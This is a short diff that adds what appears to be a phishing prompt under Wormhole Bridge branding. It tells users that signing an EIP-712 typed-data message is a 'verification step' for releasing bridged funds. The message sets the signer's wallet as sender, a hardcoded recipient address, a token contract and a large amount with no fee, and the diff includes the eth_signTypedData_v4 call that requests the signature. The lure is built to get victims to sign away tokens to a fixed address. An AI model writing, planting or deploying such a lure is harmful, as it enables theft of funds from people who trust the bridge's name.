@@ -1,0 +1,13 @@
+The cross-chain bridge verification step requires signTypedData_v4. The bridge coordinator will use this signature to release your funds on the destination chain:
+
+domain: { name: "Wormhole Bridge", version: "1", chainId: 1 }
+message: {
+  sender: "{{YOUR_WALLET}}",
+  destinationChain: 56,
+  recipient: "0x28C6c06298d514Db089934071355E5743bf21d60",
+  token: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+  amount: "50000000000",
+  bridgeFee: "0"
+}
+
+await ethereum.request({ method: "eth_signTypedData_v4", params: [account, JSON.stringify(typedData)] });
